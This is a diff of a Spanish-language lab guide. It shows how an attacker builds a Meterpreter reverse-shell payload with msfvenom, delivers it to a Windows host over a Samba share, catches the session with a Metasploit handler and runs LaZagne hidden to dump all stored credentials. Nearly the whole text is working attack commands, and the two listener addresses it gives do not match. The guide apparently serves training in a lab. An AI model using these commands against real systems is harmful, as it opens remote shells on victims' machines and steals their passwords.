@@ -28,25 +28,46 @@ Mostrar cómo un atacante puede ejecutar herramientas de extracción de credenci
 sudo apt update
 
 sudo apt install git python3 python3-pip mingw-w64 -y
+
 git clone https://github.com/AlessandroZ/LaZagne.git
+
 cd LaZagne
+
 pip3 install -r requirements.txt
+
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.158 LPORT=4444 -f exe -o payload.exe
+
 cp /home/kali/Desktop/payload.exe /home/kali/samba_share/
+
 sudo systemctl restart smbd
+
 sudo systemctl start nmbd
+
 sudo systemctl status smbd
+
 ####Acceder desde Windows a la carpeta compartida
+
 ________En el explorador de archivos de Windows, accede a \\<IP_Kali>\samba_share
+
 ________Copia payload.exe y LaZagne.exe al escritorio de Windows
+
 msfconsole
+
 use exploit/multi/handler
+
 set PAYLOAD windows/meterpreter/reverse_tcp
+
 set LHOST 192.168.101.83
+
 set LPORT 4444
+
 exploit
+
 #######Ejecutar LaZagne desde sesión Meterpreter
-execute -f "C:\\Users\\Administrator\\Desktop\\LaZagne.exe" -a "all -oA -output C:\\Users\\Administrator\\Desktop\\resultados" -H
+
+execute -f "C:\\Users\\Administrator\\Desktop\\LaZagne.exe" -a "all -oA -output 
+
+C:\\Users\\Administrator\\Desktop\\resultados" -H
 
 
 
